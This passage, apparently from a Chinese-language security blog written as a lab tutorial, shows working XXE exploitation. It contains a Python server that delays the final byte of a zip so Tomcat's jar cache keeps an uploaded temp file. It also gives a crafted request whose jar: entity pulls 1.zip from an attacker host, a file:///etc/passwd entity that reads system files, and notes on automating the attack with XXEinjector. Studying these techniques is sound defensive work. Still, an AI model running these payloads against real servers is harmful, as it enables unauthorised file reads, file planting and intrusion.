&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;def &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;handle&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;self&lt;&#x2F;span&gt;&lt;span&gt;):
&lt;&#x2F;span&gt;&lt;span&gt;        http_req = &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;b&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;&amp;#39;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;New connection:&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;self&lt;&#x2F;span&gt;&lt;span&gt;.client_address)
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;while b&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;\r\n\r\n&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39; not in http_req:
&lt;&#x2F;span&gt;&lt;span&gt;            &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;try&lt;&#x2F;span&gt;&lt;span&gt;:
&lt;&#x2F;span&gt;&lt;span&gt;                http_req += &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;self&lt;&#x2F;span&gt;&lt;span&gt;.request.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;recv&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;4096&lt;&#x2F;span&gt;&lt;span&gt;)
&lt;&#x2F;span&gt;&lt;span&gt;                &lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;Client req:&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;\r\n&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;,http_req.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;decode&lt;&#x2F;span&gt;&lt;span&gt;())
&lt;&#x2F;span&gt;&lt;span&gt;                jf = &lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;open&lt;&#x2F;span&gt;&lt;span&gt;(jar_file, &amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;rb&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;)
&lt;&#x2F;span&gt;&lt;span&gt;                contents = jf.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;read&lt;&#x2F;span&gt;&lt;span&gt;()
&lt;&#x2F;span&gt;&lt;span&gt;                headers = (&amp;#39;&amp;#39;&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;HTTP&#x2F;1.0 200 OK&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;\r\n&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;&amp;#39;&amp;#39;
&lt;&#x2F;span&gt;&lt;span&gt;                &amp;#39;&amp;#39;&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;Content-Type: application&#x2F;java-archive&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;\r\n\r\n&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;&amp;#39;&amp;#39;)
&lt;&#x2F;span&gt;&lt;span&gt;                &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;self&lt;&#x2F;span&gt;&lt;span&gt;.request.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;sendall&lt;&#x2F;span&gt;&lt;span&gt;(headers.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;encode&lt;&#x2F;span&gt;&lt;span&gt;(&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;ascii&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;))
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;                &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;self&lt;&#x2F;span&gt;&lt;span&gt;.request.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;sendall&lt;&#x2F;span&gt;&lt;span&gt;(contents[:-&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span&gt;])
&lt;&#x2F;span&gt;&lt;span&gt;                time.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;sleep&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;30&lt;&#x2F;span&gt;&lt;span&gt;)
&lt;&#x2F;span&gt;&lt;span&gt;                &lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;30&lt;&#x2F;span&gt;&lt;span&gt;)
&lt;&#x2F;span&gt;&lt;span&gt;                &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;self&lt;&#x2F;span&gt;&lt;span&gt;.request.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;sendall&lt;&#x2F;span&gt;&lt;span&gt;(contents[-&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span&gt;:])
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;            &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;except &lt;&#x2F;span&gt;&lt;span&gt;Exception &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;as &lt;&#x2F;span&gt;&lt;span&gt;e:
&lt;&#x2F;span&gt;&lt;span&gt;                &lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;print &lt;&#x2F;span&gt;&lt;span&gt;(&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;get error at:&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;str&lt;&#x2F;span&gt;&lt;span&gt;(e))
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span&gt;__name__ == &amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;__main__&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;:
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    jarserver = socketserver.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;TCPServer&lt;&#x2F;span&gt;&lt;span&gt;((listen_host,listen_port), JarRequestHandler) 
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;print &lt;&#x2F;span&gt;&lt;span&gt;(&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;waiting for connection...&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39; + jar_file) 
&lt;&#x2F;span&gt;&lt;span&gt;    server_thread = threading.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;Thread&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;target&lt;&#x2F;span&gt;&lt;span&gt;=jarserver.serve_forever) 
&lt;&#x2F;span&gt;&lt;span&gt;    server_thread.daemon = &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;True 
&lt;&#x2F;span&gt;&lt;span&gt;    server_thread.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;start&lt;&#x2F;span&gt;&lt;span&gt;() 
&lt;&#x2F;span&gt;&lt;span&gt;    server_thread.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;join&lt;&#x2F;span&gt;&lt;span&gt;()
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;脚本先发送文件的除最后一个字符的所有内容，相隔30s再发送最后一个字符。&lt;br &#x2F;&gt;之后准备需要上传的文件，这里以一个xml文本为例&lt;br &#x2F;&gt;&lt;img src=&quot;https:&#x2F;&#x2F;cdn.nlark.com&#x2F;yuque&#x2F;0&#x2F;2021&#x2F;png&#x2F;2424924&#x2F;1624293288643-a7ce7a81-aa5d-4151-bcb0-2115d5930e90.png#align=left&amp;amp;display=inline&amp;amp;height=1748&amp;amp;margin=%5Bobject%20Object%5D&amp;amp;name=%E6%88%AA%E5%B1%8F2021-06-22%20%E4%B8%8A%E5%8D%8812.34.29.png&amp;amp;originHeight=1748&amp;amp;originWidth=2504&amp;amp;size=1840546&amp;amp;status=done&amp;amp;style=none&amp;amp;width=2504&quot; alt=&quot;截屏2021-06-22 上午12.34.29.png&quot; &#x2F;&gt;&lt;br &#x2F;&gt;将这个xml文本打包成zip文件，命名为1.zip&lt;br &#x2F;&gt;&lt;img src=&quot;https:&#x2F;&#x2F;cdn.nlark.com&#x2F;yuque&#x2F;0&#x2F;2021&#x2F;png&#x2F;2424924&#x2F;1624293478345-055c7d85-e13d-4997-937b-078881e76878.png#align=left&amp;amp;display=inline&amp;amp;height=218&amp;amp;margin=%5Bobject%20Object%5D&amp;amp;name=%E6%88%AA%E5%B1%8F2021-06-22%20%E4%B8%8A%E5%8D%8812.37.44.png&amp;amp;originHeight=426&amp;amp;originWidth=818&amp;amp;size=148918&amp;amp;status=done&amp;amp;style=none&amp;amp;width=418&quot; alt=&quot;截屏2021-06-22 上午12.37.44.png&quot; &#x2F;&gt;&lt;br &#x2F;&gt;对这个1.zip进行16进制编辑，在文件的末尾加一些废数据（目的是，上面的python脚本发送的文件不包括最后一个字符，而加上这些废数据后，这些废数据就会被当作最后一个字符舍弃，只读取文件前面正确的数据。）&lt;br &#x2F;&gt;&lt;img src=&quot;https:&#x2F;&#x2F;cdn.nlark.com&#x2F;yuque&#x2F;0&#x2F;2021&#x2F;png&#x2F;2424924&#x2F;1624294354644-6ae662db-9e83-4a76-8373-fea95b820e90.png#align=left&amp;amp;display=inline&amp;amp;height=438&amp;amp;margin=%5Bobject%20Object%5D&amp;amp;name=%E6%88%AA%E5%B1%8F2021-06-22%20%E4%B8%8A%E5%8D%8812.47.54.png&amp;amp;originHeight=958&amp;amp;originWidth=1314&amp;amp;size=536620&amp;amp;status=done&amp;amp;style=none&amp;amp;width=601&quot; alt=&quot;截屏2021-06-22 上午12.47.54.png&quot; &#x2F;&gt;&lt;br &#x2F;&gt;然后在kali主机的1.zip所在目录运行前面所说的python脚本，启动监听&lt;br &#x2F;&gt;&lt;img src=&quot;https:&#x2F;&#x2F;cdn.nlark.com&#x2F;yuque&#x2F;0&#x2F;2021&#x2F;png&#x2F;2424924&#x2F;1624295235350-e3a78c1f-a0eb-4e93-86cf-bac1f656e54e.png#align=left&amp;amp;display=inline&amp;amp;height=87&amp;amp;margin=%5Bobject%20Object%5D&amp;amp;name=%E6%88%AA%E5%B1%8F2021-06-22%20%E4%B8%8A%E5%8D%881.06.41.png&amp;amp;originHeight=170&amp;amp;originWidth=720&amp;amp;size=54196&amp;amp;status=done&amp;amp;style=none&amp;amp;width=368&quot; alt=&quot;截屏2021-06-22 上午1.06.41.png&quot; &#x2F;&gt;&lt;br &#x2F;&gt;&lt;strong&gt;在本机（mac）使用如下操作&lt;&#x2F;strong&gt;&lt;br &#x2F;&gt;之后打开burp，抓取发送到目标服务器的包&lt;br &#x2F;&gt;&lt;img src=&quot;https:&#x2F;&#x2F;cdn.nlark.com&#x2F;yuque&#x2F;0&#x2F;2021&#x2F;png&#x2F;2424924&#x2F;1624294727991-b45b8651-71f2-4126-8355-7ab41baa88b3.png#align=left&amp;amp;display=inline&amp;amp;height=1762&amp;amp;margin=%5Bobject%20Object%5D&amp;amp;name=%E6%88%AA%E5%B1%8F2021-06-22%20%E4%B8%8A%E5%8D%8812.58.06.png&amp;amp;originHeight=1762&amp;amp;originWidth=2696&amp;amp;size=482409&amp;amp;status=done&amp;amp;style=none&amp;amp;width=2696&quot; alt=&quot;截屏2021-06-22 上午12.58.06.png&quot; &#x2F;&gt;&lt;br &#x2F;&gt;改包，将数据包改为如下内容并发送&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;xml&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-xml &quot;&gt;&lt;code class=&quot;language-xml&quot; data-lang=&quot;xml&quot;&gt;&lt;span&gt;POST &#x2F;XXE&#x2F;doLogin HTTP&#x2F;1.1
&lt;&#x2F;span&gt;&lt;span&gt;Host: 192.168.43.231:8080
&lt;&#x2F;span&gt;&lt;span&gt;Content-Length: 203
&lt;&#x2F;span&gt;&lt;span&gt;Accept: application&#x2F;xml, text&#x2F;xml, *&#x2F;*; q=0.01
&lt;&#x2F;span&gt;&lt;span&gt;X-Requested-With: XMLHttpRequest
&lt;&#x2F;span&gt;&lt;span&gt;User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;90.0.4430.93 Safari&#x2F;537.36
&lt;&#x2F;span&gt;&lt;span&gt;Content-Type: application&#x2F;xml;charset=UTF-8
&lt;&#x2F;span&gt;&lt;span&gt;Origin: http:&#x2F;&#x2F;192.168.43.231:8080
&lt;&#x2F;span&gt;&lt;span&gt;Referer: http:&#x2F;&#x2F;192.168.43.231:8080&#x2F;XXE&#x2F;
&lt;&#x2F;span&gt;&lt;span&gt;Accept-Encoding: gzip, deflate
&lt;&#x2F;span&gt;&lt;span&gt;Accept-Language: zh-CN,zh;q=0.9
&lt;&#x2F;span&gt;&lt;span&gt;Connection: close
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;&amp;lt;?&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;xml &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;version&lt;&#x2F;span&gt;&lt;span&gt;=&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;1.0&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;encoding&lt;&#x2F;span&gt;&lt;span&gt;=&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;utf-8&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;?&amp;gt;
&lt;&#x2F;span&gt;&lt;span&gt;&amp;lt;!&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;DOCTYPE &lt;&#x2F;span&gt;&lt;span style=&quot;background-color:#bf616a;color:#2b303b;&quot;&gt;user[&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;background-color:#bf616a;color:#2b303b;&quot;&gt;&amp;lt;&lt;&#x2F;span&gt;&lt;span&gt;!ENTITY baz SYSTEM &amp;quot;jar:http:&#x2F;&#x2F;192.168.43.147:9999&#x2F;1.zip!&#x2F;shell.jsp&amp;quot;&amp;gt;
&lt;&#x2F;span&gt;&lt;span&gt;]&amp;gt;
&lt;&#x2F;span&gt;&lt;span&gt;&amp;lt;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;user&lt;&#x2F;span&gt;&lt;span&gt;&amp;gt;&amp;lt;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;username&lt;&#x2F;span&gt;&lt;span&gt;&amp;gt;admin&lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;&amp;amp;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;baz;&lt;&#x2F;span&gt;&lt;span&gt;&amp;lt;&#x2F;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;username&lt;&#x2F;span&gt;&lt;span&gt;&amp;gt;&amp;lt;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;password&lt;&#x2F;span&gt;&lt;span&gt;&amp;gt;admin&amp;lt;&#x2F;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;password&lt;&#x2F;span&gt;&lt;span&gt;&amp;gt;&amp;lt;&#x2F;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;user&lt;&#x2F;span&gt;&lt;span&gt;&amp;gt;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;可以看到kali处已经收到了请求&lt;br &#x2F;&gt;&lt;img src=&quot;https:&#x2F;&#x2F;cdn.nlark.com&#x2F;yuque&#x2F;0&#x2F;2021&#x2F;png&#x2F;2424924&#x2F;1624295520460-7e0aa79c-3ddb-40ac-a7b8-6caae2690035.png#align=left&amp;amp;display=inline&amp;amp;height=181&amp;amp;margin=%5Bobject%20Object%5D&amp;amp;name=%E6%88%AA%E5%B1%8F2021-06-22%20%E4%B8%8A%E5%8D%881.10.53.png&amp;amp;originHeight=394&amp;amp;originWidth=986&amp;amp;size=159705&amp;amp;status=done&amp;amp;style=none&amp;amp;width=454&quot; alt=&quot;截屏2021-06-22 上午1.10.53.png&quot; &#x2F;&gt;&lt;br &#x2F;&gt;等待30s后（前面python脚本的原因），收到回复包，在回复包中，我们得到了目标服务器的目录&lt;br &#x2F;&gt;&lt;img src=&quot;https:&#x2F;&#x2F;cdn.nlark.com&#x2F;yuque&#x2F;0&#x2F;2021&#x2F;png&#x2F;2424924&#x2F;1624295669779-36fcaa86-1d0e-49dc-9f68-5bda2a9afefc.png#align=left&amp;amp;display=inline&amp;amp;height=1762&amp;amp;margin=%5Bobject%20Object%5D&amp;amp;name=%E6%88%AA%E5%B1%8F2021-06-22%20%E4%B8%8A%E5%8D%881.13.31.png&amp;amp;originHeight=1762&amp;amp;originWidth=2696&amp;amp;size=713365&amp;amp;status=done&amp;amp;style=none&amp;amp;width=2696&quot; alt=&quot;截屏2021-06-22 上午1.13.31.png&quot; &#x2F;&gt;&lt;br &#x2F;&gt;其中 jar_cache1237144420571861472.tmp 文件即我们所上传的1.zip文件，根据jar的原理，tomcat在收到1.zip后，则将其变成tmp后缀（是的，只是改了下后缀），之后再将tmp文件解压，然后得到里面的内容，然后迅速将tmp文件删除。但这里我们在路径中写了一个不存在的 shell.jsp ,所以tomcat找不到，并且报错（向我们传递了tomcat目录）。并且最重要的是，由于我们的python脚本在文件发送过程中停止了30s，所以此tmp文件在tomcat关闭之前并不会被删除，由此，我们的文件上处成功。&lt;&#x2F;p&gt;
&lt;p&gt;可以看到，在目标服务器中，已经存在我们所上传的tmp文件&lt;br &#x2F;&gt;&lt;img src=&quot;https:&#x2F;&#x2F;cdn.nlark.com&#x2F;yuque&#x2F;0&#x2F;2021&#x2F;png&#x2F;2424924&#x2F;1624296212889-d37f76fe-a344-4298-af52-ad211176b059.png#align=left&amp;amp;display=inline&amp;amp;height=1184&amp;amp;margin=%5Bobject%20Object%5D&amp;amp;name=%E6%88%AA%E5%B1%8F2021-06-22%20%E4%B8%8A%E5%8D%881.22.42.png&amp;amp;originHeight=1184&amp;amp;originWidth=1574&amp;amp;size=203616&amp;amp;status=done&amp;amp;style=none&amp;amp;width=1574&quot; alt=&quot;截屏2021-06-22 上午1.22.42.png&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;h2 id=&quot;pythonxia-de-xxelou-dong&quot;&gt;python下的XXE漏洞&lt;&#x2F;h2&gt;
&lt;p&gt;本实验使用kali linux作为目标服务器，mac作为攻击机&lt;br &#x2F;&gt;kali开启服务&lt;br &#x2F;&gt;&lt;img src=&quot;https:&#x2F;&#x2F;cdn.nlark.com&#x2F;yuque&#x2F;0&#x2F;2021&#x2F;png&#x2F;2424924&#x2F;1624297815175-dc4403cd-9a17-4c51-a650-9a0d6b3f51ff.png#align=left&amp;amp;display=inline&amp;amp;height=139&amp;amp;margin=%5Bobject%20Object%5D&amp;amp;name=%E6%88%AA%E5%B1%8F2021-06-22%20%E4%B8%8A%E5%8D%881.48.06.png&amp;amp;originHeight=430&amp;amp;originWidth=1282&amp;amp;size=205493&amp;amp;status=done&amp;amp;style=none&amp;amp;width=414&quot; alt=&quot;截屏2021-06-22 上午1.48.06.png&quot; &#x2F;&gt;&lt;br &#x2F;&gt;访问服务器&lt;br &#x2F;&gt;&lt;img src=&quot;https:&#x2F;&#x2F;cdn.nlark.com&#x2F;yuque&#x2F;0&#x2F;2021&#x2F;png&#x2F;2424924&#x2F;1624297885799-1b4e3a18-7bec-4488-8a5d-de45ec68f120.png#align=left&amp;amp;display=inline&amp;amp;height=1662&amp;amp;margin=%5Bobject%20Object%5D&amp;amp;name=%E6%88%AA%E5%B1%8F2021-06-22%20%E4%B8%8A%E5%8D%881.47.18.png&amp;amp;originHeight=1662&amp;amp;originWidth=2604&amp;amp;size=412582&amp;amp;status=done&amp;amp;style=none&amp;amp;width=2604&quot; alt=&quot;截屏2021-06-22 上午1.47.18.png&quot; &#x2F;&gt;&lt;br &#x2F;&gt;burp抓包改包发包，改包为如下&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;xml&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-xml &quot;&gt;&lt;code class=&quot;language-xml&quot; data-lang=&quot;xml&quot;&gt;&lt;span&gt;POST &#x2F;doLogin HTTP&#x2F;1.1
&lt;&#x2F;span&gt;&lt;span&gt;Host: 192.168.43.147:8008
&lt;&#x2F;span&gt;&lt;span&gt;Content-Length: 169
&lt;&#x2F;span&gt;&lt;span&gt;Accept: application&#x2F;xml, text&#x2F;xml, *&#x2F;*; q=0.01
&lt;&#x2F;span&gt;&lt;span&gt;X-Requested-With: XMLHttpRequest
&lt;&#x2F;span&gt;&lt;span&gt;User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;90.0.4430.93 Safari&#x2F;537.36
&lt;&#x2F;span&gt;&lt;span&gt;Content-Type: application&#x2F;xml;charset=UTF-8
&lt;&#x2F;span&gt;&lt;span&gt;Origin: http:&#x2F;&#x2F;192.168.43.147:8008
&lt;&#x2F;span&gt;&lt;span&gt;Referer: http:&#x2F;&#x2F;192.168.43.147:8008&#x2F;
&lt;&#x2F;span&gt;&lt;span&gt;Accept-Encoding: gzip, deflate
&lt;&#x2F;span&gt;&lt;span&gt;Accept-Language: zh-CN,zh;q=0.9
&lt;&#x2F;span&gt;&lt;span&gt;Connection: close
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;&amp;lt;?&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;xml &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;version&lt;&#x2F;span&gt;&lt;span&gt;=&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;1.0&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;encoding&lt;&#x2F;span&gt;&lt;span&gt;=&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;utf-8&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;?&amp;gt;
&lt;&#x2F;span&gt;&lt;span&gt;&amp;lt;!&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;DOCTYPE &lt;&#x2F;span&gt;&lt;span style=&quot;background-color:#bf616a;color:#2b303b;&quot;&gt;user[&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;background-color:#bf616a;color:#2b303b;&quot;&gt;&amp;lt;&lt;&#x2F;span&gt;&lt;span&gt;!ENTITY baz SYSTEM &amp;quot;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd&amp;quot;&amp;gt;
&lt;&#x2F;span&gt;&lt;span&gt;]&amp;gt;
&lt;&#x2F;span&gt;&lt;span&gt;&amp;lt;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;user&lt;&#x2F;span&gt;&lt;span&gt;&amp;gt;&amp;lt;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;username&lt;&#x2F;span&gt;&lt;span&gt;&amp;gt;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;&amp;amp;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;baz;&lt;&#x2F;span&gt;&lt;span&gt;&amp;lt;&#x2F;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;username&lt;&#x2F;span&gt;&lt;span&gt;&amp;gt;&amp;lt;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;password&lt;&#x2F;span&gt;&lt;span&gt;&amp;gt;admin&amp;lt;&#x2F;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;password&lt;&#x2F;span&gt;&lt;span&gt;&amp;gt;&amp;lt;&#x2F;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;user&lt;&#x2F;span&gt;&lt;span&gt;&amp;gt;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;发包后，可在返回包中看到passwd文件的内容&lt;br &#x2F;&gt;&lt;img src=&quot;https:&#x2F;&#x2F;cdn.nlark.com&#x2F;yuque&#x2F;0&#x2F;2021&#x2F;png&#x2F;2424924&#x2F;1624298739780-f2ad89fb-e5b8-40d2-a785-3a27ffc430bd.png#align=left&amp;amp;display=inline&amp;amp;height=1762&amp;amp;margin=%5Bobject%20Object%5D&amp;amp;name=%E6%88%AA%E5%B1%8F2021-06-22%20%E4%B8%8A%E5%8D%882.05.24.png&amp;amp;originHeight=1762&amp;amp;originWidth=2696&amp;amp;size=876145&amp;amp;status=done&amp;amp;style=none&amp;amp;width=2696&quot; alt=&quot;截屏2021-06-22 上午2.05.24.png&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;h2 id=&quot;xxezi-dong-hua-zhu-ru&quot;&gt;XXE自动化注入&lt;&#x2F;h2&gt;
&lt;p&gt;这里利用XXEinjector进行自动化注入&lt;br &#x2F;&gt;首先抓包，将发送包保存为txt文件&lt;br &#x2F;&gt;如下抓了xxe_php的包和xxe_java的包&lt;br &#x2F;&gt;&lt;img src=&quot;https:&#x2F;&#x2F;cdn.nlark.com&#x2F;yuque&#x2F;0&#x2F;2021&#x2F;png&#x2F;2424924&#x2F;1624363957889-6188a716-184b-4ddd-97fc-2d85e0f1067e.png#align=left&amp;amp;display=inline&amp;amp;height=239&amp;amp;margin=%5Bobject%20Object%5D&amp;amp;name=%E6%88%AA%E5%B1%8F2021-06-22%20%E4%B8%8B%E5%8D%888.12.27.png&amp;amp;originHeight=478&amp;amp;originWidth=242&amp;amp;size=27999&amp;amp;status=done&amp;amp;style=none&amp;amp;width=121&quot; alt=&quot;截屏2021-06-22 下午8.12.27.png&quot; &#x2F;&gt;&lt;br &#x2F;&gt;&lt;img src=&quot;https:&#x2F;&#x2F;cdn.nlark.com&#x2F;yuque&#x2F;0&#x2F;2021&#x2F;png&#x2F;2424924&#x2F;1624364004122-41bfd2a8-f3a8-4c68-9a20-b5dfb1162aed.png#align=left&amp;amp;display=inline&amp;amp;height=972&amp;amp;margin=%5Bobject%20Object%5D&amp;amp;name=%E6%88%AA%E5%B1%8F2021-06-22%20%E4%B8%8B%E5%8D%888.13.03.png&amp;amp;originHeight=972&amp;amp;originWidth=1500&amp;amp;size=255072&amp;amp;status=done&amp;amp;style=none&amp;amp;width=1500&quot; alt=&quot;截屏2021-06-22 下午8.13.03.png&quot; &#x2F;&gt;&lt;br &#x2F;&gt;&lt;img 